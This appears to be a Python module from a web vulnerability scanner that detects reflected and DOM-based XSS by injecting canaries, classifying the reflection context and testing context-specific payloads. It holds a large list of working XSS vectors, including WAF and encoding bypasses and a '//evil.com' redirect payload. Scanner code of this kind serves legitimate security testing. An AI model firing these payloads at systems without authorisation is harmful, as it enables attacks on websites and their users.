"""
AETHER XSS Engine — Real Cross-Site Scripting Detection.

Context-aware XSS detection that:
1. Injects unique canary markers into every discovered parameter
2. Analyzes WHERE the canary reflects (HTML body, attribute, JS, URL)
3. Selects context-appropriate payloads with encoding bypass chains
4. Verifies execution potential with proper confidence scoring

Coverage: Reflected XSS, Stored XSS indicators, DOM XSS (basic static analysis)
"""

from __future__ import annotations

import asyncio
import hashlib
import html
import logging
import random
import re
import string
import time
import uuid
from typing import Callable, Awaitable
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse, quote

import httpx

from core.http_client import ScannerAsyncClient
from core.surface_graph import ScanSurfaceGraph, response_fingerprint
from core.evidence_manager import save_evidence

logger = logging.getLogger(__name__)


def _canary(prefix: str = "aXs") -> str:
    """Generate a unique canary string unlikely to appear naturally."""
    return f"{prefix}{uuid.uuid4().hex[:8]}"


# ── Reflection Context Detection ──────────────────────────────

class ReflectionContext:
    HTML_BODY = "html_body"           # <div>CANARY</div>
    HTML_ATTR_DQ = "html_attr_dq"     # <input value="CANARY">
    HTML_ATTR_SQ = "html_attr_sq"     # <input value='CANARY'>
    HTML_ATTR_UQ = "html_attr_unquoted"  # <input value=CANARY>
    JS_STRING_DQ = "js_string_dq"     # var x = "CANARY"
    JS_STRING_SQ = "js_string_sq"     # var x = 'CANARY'
    JS_TEMPLATE = "js_template"       # var x = `CANARY`
    HTML_COMMENT = "html_comment"     # <!-- CANARY -->
    URL_CONTEXT = "url_context"       # href="...CANARY..."
    NONE = "none"


def _detect_reflection_context(response_text: str, canary: str) -> list[str]:
    """Detect in which HTML/JS context(s) the canary appears."""
    contexts = []
    if canary not in response_text:
        return [ReflectionContext.NONE]
    
    # Find all occurrences and check surrounding characters
    idx = 0
    while True:
        pos = response_text.find(canary, idx)
        if pos == -1:
            break
        
        # Get surrounding context (200 chars before and after)
        start = max(0, pos - 200)
        end = min(len(response_text), pos + len(canary) + 200)
        before = response_text[start:pos]
        after = response_text[pos + len(canary):end]
        
        # Check for JS string context
        if re.search(r'["\']?\s*[:=]\s*"[^"]*$', before) and after.lstrip().startswith('"'):
            contexts.append(ReflectionContext.JS_STRING_DQ)
        elif re.search(r"['\"]?\s*[:=]\s*'[^']*$", before) and after.lstrip().startswith("'"):
            contexts.append(ReflectionContext.JS_STRING_SQ)
        elif re.search(r'["\']?\s*[:=]\s*`[^`]*$', before):
            contexts.append(ReflectionContext.JS_TEMPLATE)
        # Check for HTML attribute context
        elif re.search(r'=\s*"[^"]*$', before):
            contexts.append(ReflectionContext.HTML_ATTR_DQ)
        elif re.search(r"=\s*'[^']*$", before):
            contexts.append(ReflectionContext.HTML_ATTR_SQ)
        elif re.search(r'=\s*\S*$', before) and not re.search(r'["\']$', before):
            contexts.append(ReflectionContext.HTML_ATTR_UQ)
        # Check for HTML comment
        elif "<!--" in before and "-->" not in before[before.rfind("<!--"):]:
            contexts.append(ReflectionContext.HTML_COMMENT)
        # Check for URL context (href, src, action attributes)
        elif re.search(r'(?:href|src|action|formaction|data|poster)\s*=\s*["\'][^"\']*$', before, re.I):
            contexts.append(ReflectionContext.URL_CONTEXT)
        # Check if inside <script> tag
        elif re.search(r'<script[^>]*>[^<]*$', before, re.I):
            # Inside a script tag but not in a string
            if '"' not in before[before.rfind('<script'):] and "'" not in before[before.rfind('<script'):]:
                contexts.append(ReflectionContext.JS_STRING_DQ)  # Treat as JS context
        else:
            contexts.append(ReflectionContext.HTML_BODY)
        
        idx = pos + len(canary)
    
    return contexts if contexts else [ReflectionContext.NONE]


# ── Context-Specific Payloads ──────────────────────────────────

def _get_payloads_for_context(context: str, canary: str) -> list[dict]:
    """Return payloads optimized for the detected reflection context."""
    
    marker = _canary("xV")  # Verification marker
    
    payloads = {
        ReflectionContext.HTML_BODY: [
            {"payload": f"<img src=x onerror=alert(1)>", "name": "img-onerror", "severity": "High"},
            {"payload": f"<svg onload=alert(1)>", "name": "svg-onload", "severity": "High"},
            {"payload": f"<details open ontoggle=alert(1)>", "name": "details-ontoggle", "severity": "High"},
            {"payload": f"<body onload=alert(1)>", "name": "body-onload", "severity": "High"},
            {"payload": f"<marquee onstart=alert(1)>", "name": "marquee-onstart", "severity": "Medium"},
            {"payload": f"<video><source onerror=alert(1)>", "name": "video-source-onerror", "severity": "High"},
            {"payload": f"<math><mtext><table><mglyph><svg><mtext><textarea><path id=x d=\"M0,0\"><img src=x onerror=alert(1)>", "name": "math-nested-bypass", "severity": "High"},
            {"payload": f"<iframe srcdoc='<script>alert(1)</script>'>", "name": "iframe-srcdoc", "severity": "High"},
            {"payload": f"\"><img src=x onerror=alert(1)>", "name": "break-attr-img", "severity": "High"},
            {"payload": f"'><img src=x onerror=alert(1)>", "name": "break-sq-attr-img", "severity": "High"},
            # Encoding bypasses
            {"payload": f"<img src=x onerror=alert&#40;1&#41;>", "name": "html-entity-bypass", "severity": "High"},
            {"payload": f"<img/src=x onerror=alert(1)>", "name": "slash-bypass", "severity": "High"},
            {"payload": f"<iMg sRc=x oNeRrOr=alert(1)>", "name": "case-variation", "severity": "High"},
            {"payload": f"<img src=x onerror=\\u0061lert(1)>", "name": "unicode-escape", "severity": "Medium"},
            # WAF bypass patterns
            {"payload": f"<svg/onload=confirm(1)>", "name": "svg-confirm", "severity": "High"},
            {"payload": f"<input autofocus onfocus=alert(1)>", "name": "input-autofocus", "severity": "High"},
            {"payload": f"<select autofocus onfocus=alert(1)>", "name": "select-autofocus", "severity": "High"},
            {"payload": f"<textarea autofocus onfocus=alert(1)>", "name": "textarea-autofocus", "severity": "High"},
        ],
        ReflectionContext.HTML_ATTR_DQ: [
            {"payload": f'" onmouseover="alert(1)" x="', "name": "attr-dq-event", "severity": "High"},
            {"payload": f'" onfocus="alert(1)" autofocus="', "name": "attr-dq-autofocus", "severity": "High"},
            {"payload": f'"><img src=x onerror=alert(1)>', "name": "attr-dq-break-img", "severity": "High"},
            {"payload": f'"><svg onload=alert(1)>', "name": "attr-dq-break-svg", "severity": "High"},
            {"payload": f'" style="background:url(javascript:alert(1))"', "name": "attr-dq-style", "severity": "Medium"},
            {"payload": f'"accesskey="x"onclick="alert(1)"', "name": "attr-dq-accesskey", "severity": "Medium"},
        ],
        ReflectionContext.HTML_ATTR_SQ: [
            {"payload": f"' onmouseover='alert(1)' x='", "name": "attr-sq-event", "severity": "High"},
            {"payload": f"' onfocus='alert(1)' autofocus='", "name": "attr-sq-autofocus", "severity": "High"},
            {"payload": f"'><img src=x onerror=alert(1)>", "name": "attr-sq-break-img", "severity": "High"},
        ],
        ReflectionContext.HTML_ATTR_UQ: [
            {"payload": f" onmouseover=alert(1) ", "name": "attr-uq-event", "severity": "High"},
            {"payload": f" onfocus=alert(1) autofocus ", "name": "attr-uq-autofocus", "severity": "High"},
            {"payload": f"><img src=x onerror=alert(1)>", "name": "attr-uq-break", "severity": "High"},
        ],
        ReflectionContext.JS_STRING_DQ: [
            {"payload": f'";alert(1);//', "name": "js-dq-break", "severity": "Critical"},
            {"payload": f'"-alert(1)-"', "name": "js-dq-expression", "severity": "Critical"},
            {"payload": f'";</script><img src=x onerror=alert(1)>', "name": "js-dq-break-script", "severity": "Critical"},
            {"payload": f'\\";alert(1);//', "name": "js-dq-escape-break", "severity": "Critical"},
        ],
        ReflectionContext.JS_STRING_SQ: [
            {"payload": f"';alert(1);//", "name": "js-sq-break", "severity": "Critical"},
            {"payload": f"'-alert(1)-'", "name": "js-sq-expression", "severity": "Critical"},
            {"payload": f"';</script><img src=x onerror=alert(1)>", "name": "js-sq-break-script", "severity": "Critical"},
        ],
        ReflectionContext.JS_TEMPLATE: [
            {"payload": f"${{alert(1)}}", "name": "js-template-expression", "severity": "Critical"},
            {"payload": f"`-alert(1)-`", "name": "js-template-break", "severity": "Critical"},
        ],
        ReflectionContext.URL_CONTEXT: [
            {"payload": f"javascript:alert(1)", "name": "javascript-uri", "severity": "High"},
            {"payload": f"javascript:alert(1)//", "name": "javascript-uri-comment", "severity": "High"},
            {"payload": f"data:text/html,<script>alert(1)</script>", "name": "data-uri", "severity": "High"},
            {"payload": f"//evil.com", "name": "protocol-relative-redirect", "severity": "Medium"},
        ],
        ReflectionContext.HTML_COMMENT: [
            {"payload": f"--><img src=x onerror=alert(1)><!--", "name": "comment-break", "severity": "High"},
        ],
    }
    
    return payloads.get(context, payloads[ReflectionContext.HTML_BODY])


# ── DOM XSS Source/Sink Analysis ──────────────────────────────

DOM_SOURCES = [
    "document.URL", "document.documentURI", "document.referrer",
    "location.href", "location.search", "location.hash", "location.pathname",
    "window.name", "document.cookie",
    "history.pushState", "history.replaceState",
    "localStorage", "sessionStorage",
    "URLSearchParams",
]

DOM_SINKS = [
    "eval(", "setTimeout(", "setInterval(", "Function(",
    "innerHTML", "outerHTML", "insertAdjacentHTML", "document.write(",
    "document.writeln(",
    ".src", ".href", ".action", ".formAction",
    "$.html(", "$(", "jQuery(",
    "postMessage(",
]


def _analyze_dom_xss(js_content: str, url: str) -> list[dict]:
    """Basic static analysis for DOM XSS source-to-sink flows."""
    findings = []
    sources_found = []
    sinks_found = []
    
    for source in DOM_SOURCES:
        if source in js_content:
            sources_found.append(source)
    
    for sink in DOM_SINKS:
        if sink in js_content:
            sinks_found.append(sink)
    
    # If both sources and sinks exist in the same file, flag it
    if sources_found and sinks_found:
        findings.append({
            "type": "Potential DOM-based XSS",
            "severity": "Medium",
            "module": "xss_engine",
            "vector": f"JavaScript source at {url}",
            "payload": f"Sources: {', '.join(sources_found[:5])} → Sinks: {', '.join(sinks_found[:5])}",
            "description": f"JavaScript file contains both user-controllable sources ({len(sources_found)}) and dangerous sinks ({len(sinks_found)}). Manual review recommended for source-to-sink data flow.",
            "confidence": "low",
            "confidence_score": 0.4,
            "verification_state": "candidate",
            "remediation": "Sanitize all user input before passing to DOM manipulation functions. Use textContent instead of innerHTML. Avoid eval() and document.write().",
            "patch_provided": True,
        })
    
    return findings


# ── Main XSS Scanner ──────────────────────────────────────────

async def run_xss_scan(
    url: str,
    intensity: str,
    broadcast_cb: Callable[[dict], Awaitable[None]],
    *,
    surface_graph: ScanSurfaceGraph | None = None,
    auth_profiles: dict | None = None,
    scan_config: dict | None = None,
) -> list[dict]:
    """
    Run comprehensive XSS scanning against all discovered injection points.
    """
    findings = []
    start_time = time.monotonic()
    
    await broadcast_cb({"type": "log", "message": "XSS Engine: Starting context-aware cross-site scripting detection..."})
    
    # Gather all injection targets from the surface graph
    injection_targets = []
    if surface_graph:
        for node in surface_graph.targets():
            node_url = node.get("url", "")
            method = node.get("method", "GET")
            params = node.get("params", [])
            
            # Add URL query parameters as injection targets
            parsed = urlparse(node_url)
            query_params = list(parse_qs(parsed.query).keys())
            
            if params or query_params:
                injection_targets.append({
                    "url": node_url,
                    "method": method,
                    "params": list(set(params + query_params)),
                })
    
    # Always include the base URL with common test parameters
    if not injection_targets:
        injection_targets = [{"url": url, "method": "GET", "params": ["q", "search", "id", "name", "page"]}]
    
    # Also extract params from the URL itself
    parsed_base = urlparse(url)
    base_params = list(parse_qs(parsed_base.query).keys())
    if base_params and not any(t["url"] == url for t in injection_targets):
        injection_targets.insert(0, {"url": url, "method": "GET", "params": base_params})
    
    max_targets = {"stealth": 5, "normal": 20, "aggressive": 50, "extreme": 100}.get(intensity, 20)
    injection_targets = injection_targets[:max_targets]
    
    await broadcast_cb({
        "type": "log",
        "message": f"    Testing {sum(len(t['params']) for t in injection_targets)} injection points across {len(injection_targets)} endpoints"
    })
    
    concurrency = {"stealth": 2, "normal": 5, "aggressive": 10, "extreme": 20}.get(intensity, 5)
    semaphore = asyncio.Semaphore(concurrency)
    tested_count = 0
    
    async with ScannerAsyncClient(
        timeout=httpx.Timeout(15.0),
        follow_redirects=True,
        verify=False,
    ) as client:
        
        for target in injection_targets:
            target_url = target["url"]
            method = target["method"]
            params = target["params"]
            
            for param in params:
                tested_count += 1
                canary = _canary()
                
                # Step 1: Inject canary to detect reflection
                try:
                    async with semaphore:
                        if method == "GET":
                            parsed = urlparse(target_url)
                            existing_params = parse_qs(parsed.query)
                            existing_params[param] = [canary]
                            test_url = urlunparse(parsed._replace(query=urlencode(existing_params, doseq=True)))
                            resp = await client.get(test_url)
                        else:
                            resp = await client.post(target_url, data={param: canary})
                except Exception as e:
                    logger.debug("XSS canary request failed for %s@%s: %s", param, target_url, e)
                    continue
                
                # Step 2: Detect reflection context
                contexts = _detect_reflection_context(resp.text, canary)
                
                if ReflectionContext.NONE in contexts:
                    continue  # No reflection — skip this param
                
                await broadcast_cb({
                    "type": "log",
                    "message": f"    ⚡ Reflection detected: {param} @ {urlparse(target_url).path} → context: {', '.join(contexts)}"
                })
                
                # Step 3: Test context-specific payloads
                for context in set(contexts):
                    payloads = _get_payloads_for_context(context, canary)
                    
                    for payload_info in payloads:
                        payload = payload_info["payload"]
                        
                        try:
                            async with semaphore:
                                if method == "GET":
                                    parsed = urlparse(target_url)
                                    test_params = parse_qs(parsed.query)
                                    test_params[param] = [payload]
                                    test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
                                    resp2 = await client.get(test_url)
                                else:
                                    resp2 = await client.post(target_url, data={param: payload})
                        except Exception:
                            continue
                        
                        # Step 4: Check if payload executed (appears unescaped)
                        response_lower = resp2.text.lower()
                        payload_lower = payload.lower()
                        
                        # Check for unescaped reflection of the dangerous payload
                        is_reflected = payload in resp2.text
                        is_reflected_lower = payload_lower in response_lower
                        
                        # Check for HTML-encoded version (means the app IS encoding — safer)
                        is_encoded = html.escape(payload) in resp2.text
                        
                        if is_reflected and not is_encoded:
                            # Payload reflected WITHOUT encoding — confirmed XSS
                            evidence = save_evidence(
                                "xss_engine", target_url, resp2,
                                extra_info=f"Parameter: {param}\nContext: {context}\nPayload: {payload}\nPayload Name: {payload_info['name']}\nReflection: UNESCAPED"
                            )
                            
                            finding = {
                                "type": f"Reflected XSS ({payload_info['name']})",
                                "severity": payload_info["severity"],
                                "module": "xss_engine",
                                "vector": f"{method} {urlparse(target_url).path} → param: {param}",
                                "payload": payload,
                                "evidence": evidence,
                                "description": f"The parameter '{param}' reflects user input in a {context} context without proper encoding. "
                                             f"The payload '{payload_info['name']}' was reflected unescaped, indicating a confirmed XSS vulnerability.",
                                "confidence": "high",
                                "confidence_score": 0.95,
                                "verification_state": "verified",
                                "remediation": f"HTML-encode all user input before rendering in {context} context. "
                                             "Use Content-Security-Policy headers to prevent inline script execution. "
                                             "Implement input validation to reject HTML/JS special characters.",
                                "patch_provided": True,
                                "target_url": target_url,
                                "wstg": "WSTG-INPV-01",
                                "cwe": ["CWE-79"],
                                "owasp_category": "A03:2021 Injection",
                            }
                            findings.append(finding)
                            
                            await broadcast_cb({
                                "type": "log",
                                "message": f"    🔴 CONFIRMED XSS: {param} @ {urlparse(target_url).path} [{payload_info['name']}] (context: {context})"
                            })
                            
                            # Don't test more payloads for this param+context — already confirmed
                            break
                        
                        elif is_reflected_lower and not is_encoded:
                            # Partial match — possible with case-insensitive handling
                            evidence = save_evidence(
                                "xss_engine", target_url, resp2,
                                extra_info=f"Parameter: {param}\nContext: {context}\nPayload: {payload}\nReflection: PARTIAL (case-insensitive match)"
                            )
                            
                            finding = {
                                "type": f"Potential XSS ({payload_info['name']})",
                                "severity": "Medium",
                                "module": "xss_engine",
                                "vector": f"{method} {urlparse(target_url).path} → param: {param}",
                                "payload": payload,
                                "evidence": evidence,
                                "description": f"The parameter '{param}' partially reflects user input. "
                                             f"Case-insensitive match detected for payload '{payload_info['name']}'. Manual verification recommended.",
                                "confidence": "medium",
                                "confidence_score": 0.6,
                                "verification_state": "observed",
                                "remediation": "Implement strict output encoding and Content-Security-Policy headers.",
                                "patch_provided": True,
                                "target_url": target_url,
                                "wstg": "WSTG-INPV-01",
                                "cwe": ["CWE-79"],
                            }
                            findings.append(finding)
                            break
        
        # Phase 2: DOM XSS analysis on discovered JavaScript files
        if surface_graph and intensity in ("aggressive", "extreme"):
            js_targets = surface_graph.targets(kinds={"script"})
            for js_node in js_targets[:20]:
                try:
                    async with semaphore:
                        js_resp = await client.get(js_node["url"], timeout=10)
                    if js_resp.status_code == 200 and len(js_resp.text) < 2_000_000:
                        dom_findings = _analyze_dom_xss(js_resp.text, js_node["url"])
                        findings.extend(dom_findings)
                except Exception:
                    pass
    
    elapsed = time.monotonic() - start_time
    confirmed = sum(1 for f in findings if f.get("verification_state") == "verified")
    
    await broadcast_cb({
        "type": "log",
        "message": f"    XSS Engine Complete ({elapsed:.1f}s): {len(findings)} findings ({confirmed} confirmed) from {tested_count} injection points"
    })
    
    return findings
